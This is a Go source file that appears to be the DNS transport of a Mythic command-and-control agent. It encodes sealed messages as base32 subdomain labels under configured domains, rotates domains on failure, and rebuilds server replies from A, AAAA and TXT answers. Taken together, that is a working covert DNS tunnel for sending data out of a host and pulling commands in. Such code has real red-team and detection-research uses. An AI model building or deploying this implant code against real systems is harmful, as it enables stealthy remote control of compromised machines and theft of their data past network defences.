package main

import (
	"crypto/rand"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"math/big"
	"net"
	"strings"
	"time"
)

// Mythic dns profile client. Messages travel as DnsPacket protobufs,
// base32 (no padding) inside query subdomains; the sealed envelope stays
// raw (NOT base64). Replies come back framed in A/AAAA/TXT answers with an
// order byte plus CBC-style padding (fixed records) or base64 chunks (TXT).
type dnsTransport struct {
	domains   []string
	rotation  string
	threshold int
	server    string
	qtype     uint16
	maxQuery  int
	maxSub    int
	session   uint32
	idx       int
	fails     int
}

const (
	dnsActionAgentToServer = 0
	dnsActionServerToAgent = 1
	dnsActionReTransmit    = 2
	dnsActionMessageLost   = 3
)

func newDNSTransport(c Config) (*dnsTransport, error) {
	if len(c.Domains) == 0 {
		return nil, fmt.Errorf("dns domains are empty")
	}
	var qtype uint16
	switch c.RecordType {
	case "", "A":
		qtype = 1
	case "AAAA":
		qtype = 28
	case "TXT":
		qtype = 16
	default:
		return nil, fmt.Errorf("bad dns record_type %q", c.RecordType)
	}
	rotation := c.DomainRotation
	if rotation == "" {
		rotation = "fail-over"
	}
	threshold := c.FailoverThreshold
	if threshold <= 0 {
		threshold = 5
	}
	maxQuery := c.MaxQueryLength
	if maxQuery <= 0 {
		maxQuery = 255
	}
	maxSub := c.MaxSubdomainLength
	if maxSub <= 0 {
		maxSub = 64
	}
	server := c.DnsServer
	if server == "" {
		server = "8.8.8.8:53"
	}
	var session uint32
	if err := binary.Read(rand.Reader, binary.BigEndian, &session); err != nil {
		return nil, err
	}
	return &dnsTransport{
		domains: c.Domains, rotation: rotation, threshold: threshold,
		server: server, qtype: qtype, maxQuery: maxQuery, maxSub: maxSub,
		session: session,
	}, nil
}

func (t *dnsTransport) exchange(sealed []byte) ([]byte, error) {
	var msgID uint32
	if err := binary.Read(rand.Reader, binary.BigEndian, &msgID); err != nil {
		return nil, err
	}
	err := t.upload(msgID, sealed)
	t.rotate(err == nil)
	if err != nil {
		return nil, err
	}
	out, err := t.download(msgID)
	t.rotate(err == nil)
	return out, err
}

// rotate moves to the next domain per the rotation pattern.
func (t *dnsTransport) rotate(ok bool) {
	switch t.rotation {
	case "round-robin":
		t.idx = (t.idx + 1) % len(t.domains)
	case "random":
		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(t.domains))))
		if err == nil {
			t.idx = int(n.Int64())
		}
	default: // fail-over
		if ok {
			t.fails = 0
			return
		}
		t.fails++
		if t.fails >= t.threshold {
			t.fails = 0
			t.idx = (t.idx + 1) % len(t.domains)
		}
	}
}

func (t *dnsTransport) upload(msgID uint32, sealed []byte) error {
	chunks, err := t.splitData(msgID, sealed)
	if err != nil {
		return err
	}
	total := uint32(len(chunks))
	for attempt := 0; attempt < 3; attempt++ {
		done := true
		for i, data := range chunks {
			pkt := marshalDnsPacket(dnsPacket{
				action: dnsActionAgentToServer, session: t.session,
				msgID: msgID, total: total, current: uint32(i), data: data,
			})
			action, _, err := t.roundTrip(pkt)
			if err != nil {
				return err
			}
			switch action {
			case dnsActionAgentToServer:
				if i == len(chunks)-1 {
					return fmt.Errorf("dns upload not acknowledged")
				}
			case dnsActionServerToAgent:
				return nil
			case dnsActionReTransmit:
				done = false
			default:
				return fmt.Errorf("dns upload: bad action %d", action)
			}
			if !done {
				break
			}
		}
		if done {
			return nil
		}
	}
	return fmt.Errorf("dns upload: server keeps asking for retransmit")
}

func (t *dnsTransport) download(msgID uint32) ([]byte, error) {
	var out []byte
	for current := uint32(0); ; current++ {
		pkt := marshalDnsPacket(dnsPacket{
			action: dnsActionServerToAgent, session: t.session,
			msgID: msgID, current: current,
		})
		action, answers, err := t.roundTrip(pkt)
		if err != nil {
			return nil, err
		}
		switch action {
		case dnsActionMessageLost:
			return nil, fmt.Errorf("dns reply lost on server")
		case dnsActionServerToAgent:
		default:
			return nil, fmt.Errorf("dns download: bad action %d", action)
		}
		got, total, data, err := parseDnsPacketAnswers(answers, t.qtype)
		if err != nil {
			return nil, err
		}
		if got != current {
			return nil, fmt.Errorf("dns download: want chunk %d, got %d", current, got)
		}
		out = append(out, data...)
		if total == 0 {
			return nil, fmt.Errorf("dns download: zero total chunks")
		}
		if current+1 >= total {
			return out, nil
		}
	}
}

// roundTrip sends one packet as a DNS query, returns the action answer plus
// any packet-carrying answers that follow it.
func (t *dnsTransport) roundTrip(pkt []byte) (uint32, []dnsAnswer, error) {
	qname, err := t.encodeQuery(pkt)
	if err != nil {
		return 0, nil, err
	}
	var last error
	for attempt := 0; attempt < 2; attempt++ {
		answers, err := dnsExchange(t.server, qname, t.qtype)
		if err != nil {
			last = err
			continue
		}
		if len(answers) == 0 {
			last = fmt.Errorf("dns: empty reply")
			continue
		}
		action, err := dnsActionAnswer(answers[0], t.qtype)
		if err != nil {
			last = err
			continue
		}
		return action, answers[1:], nil
	}
	return 0, nil, last
}

// splitData cuts sealed bytes into Data payloads that fit one query.
// Sizes from measured header overhead, then verified against the real
// encoder; shrinks until every chunk fits or the budget proves too small.
func (t *dnsTransport) splitData(msgID uint32, sealed []byte) ([][]byte, error) {
	domain := t.domains[t.idx%len(t.domains)]
	avail := t.maxQuery - len(domain) - 1
	if avail < 16 {
		return nil, fmt.Errorf("dns domain %q leaves no room for data", domain)
	}
	labelLen := t.maxSub
	if labelLen > 63 {
		labelLen = 63 // wire-valid labels; server joins them either way
	}
	labels := (avail + 1) / (labelLen + 1)
	if labels < 1 {
		labels = 1
	}
	maxB32 := labels * labelLen
	overhead := len(marshalDnsPacket(dnsPacket{session: t.session, msgID: msgID,
		total: 0xFFFFFFFF, current: 0xFFFFFFFF}))
	step := maxB32*5/8 - overhead - 1
	for i := 0; i < 8 && step > 0; i++ {
		var chunks [][]byte
		for rest := sealed; len(rest) > 0; {
			n := step
			if n > len(rest) {
				n = len(rest)
			}
			chunks = append(chunks, rest[:n])
			rest = rest[n:]
		}
		if len(chunks) == 0 {
			chunks = append(chunks, []byte{})
		}
		fits := true
		for j, c := range chunks {
			pkt := marshalDnsPacket(dnsPacket{session: t.session, msgID: msgID,
				total: uint32(len(chunks)), current: uint32(j), data: c})
			if _, err := t.encodeQuery(pkt); err != nil {
				fits = false
				break
			}
		}
		if fits {
			return chunks, nil
		}
		step = step * 3 / 4
	}
	return nil, fmt.Errorf("dns query budget too small")
}

// encodeQuery wraps one packet in base32 labels under the active domain.
func (t *dnsTransport) encodeQuery(pkt []byte) (string, error) {
	domain := t.domains[t.idx%len(t.domains)]
	b32 := strings.ToLower(base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(pkt))
	labelLen := t.maxSub
	if labelLen > 63 {
		labelLen = 63
	}
	var labels []string
	for len(b32) > 0 {
		n := labelLen
		if n > len(b32) {
			n = len(b32)
		}
		labels = append(labels, b32[:n])
		b32 = b32[n:]
	}
	qname := strings.Join(labels, ".") + "." + domain
	if len(qname) > t.maxQuery {
		return "", fmt.Errorf("dns query too long: %d", len(qname))
	}
	return qname, nil
}

// dnsPacket mirrors the profile's DnsPacket protobuf.
type dnsPacket struct {
	action  uint32
	session uint32
	msgID   uint32
	total   uint32
	current uint32
	data    []byte
}

func appendVarint(b []byte, v uint32) []byte {
	for v >= 0x80 {
		b = append(b, byte(v)|0x80)
		v >>= 7
	}
	return append(b, byte(v))
}

func marshalDnsPacket(p dnsPacket) []byte {
	var b []byte
	if p.action != 0 {
		b = appendVarint(append(b, 0x08), p.action)
	}
	if p.session != 0 {
		b = appendVarint(append(b, 0x10), p.session)
	}
	if p.msgID != 0 {
		b = appendVarint(append(b, 0x18), p.msgID)
	}
	if p.total != 0 {
		b = appendVarint(append(b, 0x20), p.total)
	}
	if p.current != 0 {
		b = appendVarint(append(b, 0x28), p.current)
	}
	if len(p.data) != 0 {
		b = appendVarint(append(b, 0x32), uint32(len(p.data)))
		b = append(b, p.data...)
	}
	return b
}

func unmarshalDnsPacket(b []byte) (dnsPacket, error) {
	var p dnsPacket
	for len(b) > 0 {
		tag := b[0]
		b = b[1:]
		field, wire := tag>>3, tag&0x07
		var v uint32
		switch wire {
		case 0:
			shift := uint(0)
			for {
				if len(b) == 0 {
					return p, fmt.Errorf("dns packet truncated")
				}
				c := b[0]
				b = b[1:]
				v |= uint32(c&0x7F) << shift
				if c&0x80 == 0 {
					break
				}
				shift += 7
				if shift > 35 {
					return p, fmt.Errorf("dns packet varint overflow")
				}
			}
		case 2:
			n := uint32(0)
			shift := uint(0)
			for {
				if len(b) == 0 {
					return p, fmt.Errorf("dns packet truncated")
				}
				c := b[0]
				b = b[1:]
				n |= uint32(c&0x7F) << shift
				if c&0x80 == 0 {
					break
				}
				shift += 7
			}
			if int(n) > len(b) {
				return p, fmt.Errorf("dns packet data truncated")
			}
			if field == 6 {
				p.data = append([]byte(nil), b[:n]...)
			}
			b = b[n:]
			continue
		default:
			return p, fmt.Errorf("dns packet bad wire type %d", wire)
		}
		switch field {
		case 1:
			p.action = v
		case 2:
			p.session = v
		case 3:
			p.msgID = v
		case 4:
			p.total = v
		case 5:
			p.current = v
		}
	}
	return p, nil
}

// parseDnsPacketAnswers reassembles one marshalled packet from reply answers
// (order byte first, CBC-style padding stripped; TXT joins base64 chunks).
func parseDnsPacketAnswers(answers []dnsAnswer, qtype uint16) (current, total uint32, data []byte, err error) {
	var raw []byte
	switch qtype {
	case 1, 28:
		want := 4
		if qtype == 28 {
			want = 16
		}
		ordered := map[int][]byte{}
		for _, a := range answers {
			if len(a.rdata) != want {
				return 0, 0, nil, fmt.Errorf("dns: bad answer length %d", len(a.rdata))
			}
			ordered[int(a.rdata[0])] = a.rdata[1:]
		}
		for i := 1; i <= len(ordered); i++ {
			chunk, ok := ordered[i]
			if !ok {
				return 0, 0, nil, fmt.Errorf("dns: missing chunk %d", i)
			}
			raw = append(raw, chunk...)
		}
		if len(raw) == 0 {
			return 0, 0, nil, fmt.Errorf("dns: empty packet")
		}
		pad := int(raw[len(raw)-1])
		if pad <= 0 || pad > want-1 || pad > len(raw) {
			return 0, 0, nil, fmt.Errorf("dns: bad padding %d", pad)
		}
		raw = raw[:len(raw)-pad]
	case 16:
		var joined string
		for _, a := range answers {
			joined += strings.Join(a.txt, "")
		}
		var derr error
		if raw, derr = base64.StdEncoding.DecodeString(joined); derr != nil {
			return 0, 0, nil, fmt.Errorf("dns: bad txt packet: %w", derr)
		}
	default:
		return 0, 0, nil, fmt.Errorf("dns: bad record type %d", qtype)
	}
	pkt, err := unmarshalDnsPacket(raw)
	if err != nil {
		return 0, 0, nil, err
	}
	return pkt.current, pkt.total, pkt.data, nil
}

// dnsAnswer is one parsed resource record.
type dnsAnswer struct {
	rdata []byte
	txt   []string
}

// dnsActionAnswer reads the leading action reply (last byte of A/AAAA,
// integer string of first TXT).
func dnsActionAnswer(a dnsAnswer, qtype uint16) (uint32, error) {
	switch qtype {
	case 1:
		if len(a.rdata) != 4 {
			return 0, fmt.Errorf("dns: bad A action length %d", len(a.rdata))
		}
		return uint32(a.rdata[3]), nil
	case 28:
		if len(a.rdata) != 16 {
			return 0, fmt.Errorf("dns: bad AAAA action length %d", len(a.rdata))
		}
		return uint32(a.rdata[15]), nil
	case 16:
		if len(a.txt) == 0 {
			return 0, fmt.Errorf("dns: empty TXT action")
		}
		n := atoiOr(strings.TrimSpace(a.txt[0]), -1)
		if n < 0 {
			return 0, fmt.Errorf("dns: bad TXT action %q", a.txt[0])
		}
		return uint32(n), nil
	}
	return 0, fmt.Errorf("dns: bad record type %d", qtype)
}

// dnsExchange sends one query over UDP and parses the reply answers.
func dnsExchange(server, qname string, qtype uint16) ([]dnsAnswer, error) {
	var id [2]byte
	if _, err := rand.Read(id[:]); err != nil {
		return nil, err
	}
	query := []byte{id[0], id[1], 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	for _, label := range strings.Split(qname, ".") {
		if len(label) == 0 || len(label) > 63 {
			return nil, fmt.Errorf("dns: bad label %q", label)
		}
		query = append(query, byte(len(label)))
		query = append(query, label...)
	}
	query = append(query, 0x00)
	query = append(query, byte(qtype>>8), byte(qtype), 0x00, 0x01)
	conn, err := net.DialTimeout("udp", server, 5*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	if err := conn.SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
		return nil, err
	}
	if _, err := conn.Write(query); err != nil {
		return nil, err
	}
	resp := make([]byte, 4096)
	n, err := conn.Read(resp)
	if err != nil {
		return nil, err
	}
	return dnsParseReply(resp[:n], binary.BigEndian.Uint16(id[:]), qtype)
}

func dnsSkipName(b []byte, off int) (int, error) {
	for {
		if off >= len(b) {
			return 0, fmt.Errorf("dns: name overrun")
		}
		c := b[off]
		if c&0xC0 == 0xC0 {
			return off + 2, nil
		}
		if c == 0 {
			return off + 1, nil
		}
		off += 1 + int(c)
	}
}

func dnsParseReply(resp []byte, id uint16, qtype uint16) ([]dnsAnswer, error) {
	if len(resp) < 12 {
		return nil, fmt.Errorf("dns: reply too short")
	}
	if binary.BigEndian.Uint16(resp) != id {
		return nil, fmt.Errorf("dns: id mismatch")
	}
	if resp[3]&0x0F != 0 {
		return nil, fmt.Errorf("dns: rcode %d", resp[3]&0x0F)
	}
	qd := int(binary.BigEndian.Uint16(resp[4:]))
	an := int(binary.BigEndian.Uint16(resp[6:]))
	off := 12
	for i := 0; i < qd; i++ {
		var err error
		if off, err = dnsSkipName(resp, off); err != nil {
			return nil, err
		}
		off += 4
	}
	var answers []dnsAnswer
	for i := 0; i < an; i++ {
		var err error
		if off, err = dnsSkipName(resp, off); err != nil {
			return nil, err
		}
		if off+10 > len(resp) {
			return nil, fmt.Errorf("dns: answer overrun")
		}
		typ := binary.BigEndian.Uint16(resp[off:])
		rdlen := int(binary.BigEndian.Uint16(resp[off+8:]))
		off += 10
		if off+rdlen > len(resp) {
			return nil, fmt.Errorf("dns: rdata overrun")
		}
		rdata := resp[off : off+rdlen]
		off += rdlen
		if typ != qtype {
			continue
		}
		var a dnsAnswer
		if qtype == 16 {
			for len(rdata) > 0 {
				n := int(rdata[0])
				rdata = rdata[1:]
				if n > len(rdata) {
					return nil, fmt.Errorf("dns: txt overrun")
				}
				a.txt = append(a.txt, string(rdata[:n]))
				rdata = rdata[n:]
			}
		} else {
			a.rdata = append([]byte(nil), rdata...)
		}
		answers = append(answers, a)
	}
	return answers, nil
}
